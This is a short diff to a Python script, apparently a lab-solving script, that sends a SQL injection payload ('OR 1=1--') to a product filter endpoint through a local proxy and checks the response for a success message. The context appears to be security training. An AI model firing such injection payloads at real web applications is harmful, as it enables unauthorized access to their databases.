@@ -7,7 +7,9 @@ proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def sql_injection(s, url):
     file_path = "/filter?category=Gifts'+OR+1=1--"
-    res = s.get(url+file_path, verify=False, proxies=proxies)
+    s.get(url+file_path, verify=False, proxies=proxies)
+    res = s.get(url, verify=False, proxies=proxies)
+
     if 'Congratulations' in res.text:
         print("(+) SQL Injection succeeded")
     else:
